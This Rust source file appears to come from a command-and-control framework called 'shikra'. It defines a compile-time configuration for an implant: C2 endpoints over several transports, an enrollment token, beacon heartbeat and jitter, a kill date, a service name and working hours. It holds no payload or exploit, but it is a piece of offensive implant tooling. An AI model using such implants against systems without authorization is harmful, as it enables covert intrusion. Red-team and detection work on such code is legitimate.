use serde::Deserialize;

/// Compile-time embedded operator configuration produced by `shikra-builder`.
///
/// The builder sets `SHIKRA_EMBEDDED_CONFIG_JSON` before invoking cargo; when
/// present, the built implant starts without CLI arguments.
#[derive(Debug, Clone, Deserialize)]
pub struct EmbeddedConfig {
    #[serde(default = "default_mode")]
    pub mode: String,
    #[serde(default)]
    pub c2_url: String,
    #[serde(default)]
    pub http_url: String,
    #[serde(default)]
    pub quic_url: String,
    #[serde(default)]
    pub dns_url: String,
    #[serde(default = "default_dns_zone")]
    pub dns_zone: String,
    #[serde(default)]
    pub wg_url: String,
    #[serde(default)]
    pub wg_server_public: String,
    #[serde(default)]
    pub fallback_order: String,
    #[serde(default)]
    pub enroll_token: String,
    #[serde(default)]
    pub server_identity_hex: String,
    #[serde(default)]
    pub ca_pem: String,
    #[serde(default = "default_domain")]
    pub tls_domain: String,
    #[serde(default = "default_heartbeat")]
    pub heartbeat_secs: u64,
    #[serde(default = "default_jitter")]
    pub jitter_secs: u64,
    #[serde(default)]
    pub max_runtime_secs: Option<u64>,
    #[serde(default)]
    pub poll_interval_secs: Option<u64>,
    #[serde(default)]
    pub killdate_unix: u64,
    #[serde(default)]
    pub service_name: String,
    #[serde(default)]
    pub pipe_path: String,
    #[serde(default)]
    pub working_hours: String,
    /// Beacon profiles baked in by the builder (empty when not provided).
    #[serde(default)]
    pub profiles: Vec<shikra_transport::profile::C2Profile>,
}

fn default_mode() -> String {
    "session".into()
}

fn default_domain() -> String {
    "localhost".into()
}

fn default_dns_zone() -> String {
    "dns.shikra".into()
}

fn default_heartbeat() -> u64 {
    15
}

fn default_jitter() -> u64 {
    5
}

impl EmbeddedConfig {
    /// Returns the embedded config when the builder baked one in.
    pub fn load() -> Option<Self> {
        let raw = option_env!("SHIKRA_EMBEDDED_CONFIG_JSON")?;
        match serde_json::from_str(raw) {
            Ok(config) => Some(config),
            Err(err) => {
                eprintln!("[!] embedded config is invalid: {err}");
                None
            }
        }
    }
}
